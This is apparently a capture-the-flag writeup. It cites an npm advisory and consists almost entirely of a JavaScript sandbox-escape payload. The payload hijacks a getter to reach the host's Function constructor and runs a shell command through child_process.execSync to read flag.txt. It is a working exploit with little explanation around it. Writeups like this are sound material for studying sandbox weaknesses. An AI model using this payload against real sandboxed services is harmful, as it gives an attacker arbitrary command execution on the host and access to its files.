# WRITEUP

https://www.npmjs.com/advisories/1033


```javascript
((() => { 
const targetKey = Object.keys(this)[0]; 
Object.defineProperty(this, targetKey, { 
get: function() { 
return arguments.callee.caller.constructor( 
\"return global.process.mainModule.require('child_process').execSync('cat flag.txt').toString()\" 
)(); 
} 
}); 
}))()
```

